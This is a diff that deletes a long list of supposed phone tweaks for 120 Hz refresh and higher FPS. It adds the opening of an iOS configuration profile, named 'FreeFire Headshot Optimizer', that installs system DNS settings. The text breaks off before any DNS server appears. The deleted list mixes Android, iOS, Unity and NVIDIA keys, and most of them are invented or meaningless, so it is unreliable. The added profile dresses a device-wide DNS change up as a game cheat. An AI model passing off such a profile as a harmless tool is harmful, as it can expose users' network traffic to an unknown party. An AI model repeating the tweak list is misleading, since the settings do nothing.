@@ -1,54 +1,18 @@
-ro.product.model: IPHONE
-ro.product.odm.model: IPHONE
-ro.product.system.model: IPHONE
-ro.product.vendor.model: IPHONE
-ro.product.system_ext.model: IPHONE
-ro.product.manufacturer: IPHONE
-R.integer.config_defaultRefreshRate=120
-Settings.System.PEAK_REFRESH_RATE=120
-R.integer.config_defaultPeakRefreshRate=120
-self.displayLink.setPreferredFrameRateRange:CAFrameRateRangeMake=120
-self.displayLink.setPreferredFrameRateRange=120
-self.display.Link.set.Preferred.Frame.Rate.Range=120
-ro.self.display.Link.set.Preferred.Frame.Rate.Range=120
-ro.set.Preferred.Frame.Rate.Range=120
-CAFrameRateRangeMake=120
-Settings.System.MIN_REFRESH_RATE=120
-peak.refresh.rate=120
-peak_refresh_rate=120
-setFrameRate = 120
-set_screen_refresh_rate = 120
-screen.ghz = 120
-screen.hz = 120
-screen_refresh_rate = 120
-user_screen_refresh_rate = 120
-no_vsync = 1
-debug.egl.swapinterval = 0
-debug.gr.swapinterval = 0
-Application.targetFrameRate = 120
-QualitySettings.vSyncCount = 0
-SetVsync0_120FPS = 120
-windowsmgr.max_events_per_sec = 120
-ro.surface_flinger.use_content_detection_for_refresh_rate=120
-ro.surface_flinger.set_touch_timer_ms=0
-ro.surface_flinger.set_idle_timer_ms=0
-ro.surface_flinger.set_display_power_timer_ms=0
-display_refresh_mode=120
-display.refresh.mode=120
-min_refresh_rate=120
-user.screen.refresh.rate=120
-user.refresh.rate=120
-user_refresh_rate=120
-ro.display.ninetyhz=120
-ro.display.hz=240000
-ro.cpufreq.game=1
-persist.sys.NV_FPSLIMIT=120
-persist.sys.NV_POWERMODE=1
-persist.sys.NV_PROFVER=15
-persist.sys.NV_STEREOCTRL=0
-persist.sys.NV_STEREOSEPCHG=0
-persist.sys.NV_STEREOSEP=20
-persist.sys.purgeable_assets=1
-persist.sys.use_16bpp_alpha=1
-ro.Form.Factor=touch
-ro.fps.capsmax=900
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadDisplayName</key>
+            <string>FreeFire Headshot Optimizer</string>
+            <key>PayloadIdentifier</key>
+            <string>com.dark.freefire.headshot.optimizer</string>
+            <key>PayloadType</key>
+            <string>com.apple.dnsSettings</string>
+            <key>PayloadUUID</key>
+            <string>E8A5D3B0-7F2A-4C1D-9E8F-3B7A6D5C4E1F</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>DNSSettings
